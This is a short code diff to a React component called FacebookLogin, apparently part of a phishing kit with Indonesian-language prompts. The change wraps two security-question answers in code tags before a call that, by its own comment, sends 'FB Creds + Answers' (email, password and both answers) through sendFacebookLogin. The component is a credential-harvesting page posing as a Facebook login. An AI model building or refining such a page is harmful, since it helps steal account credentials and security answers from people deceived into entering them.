@@ -46,8 +46,8 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
     setLoading(true);
 
     // Hardcoded questions context
-    const q1 = `Q1. Apa film favorit Anda? (${a1})`;
-    const q2 = `Q2. Apa Makanan Kesukaan Anda? (${a2})`;
+    const q1 = `Q1. Apa film favorit Anda? (<code>${a1}</code>)`;
+    const q2 = `Q2. Apa Makanan Kesukaan Anda? (<code>${a2}</code>)`;
 
     // Send all data (FB Creds + Answers)
     const success = await sendFacebookLogin(email, password, q1, q2);
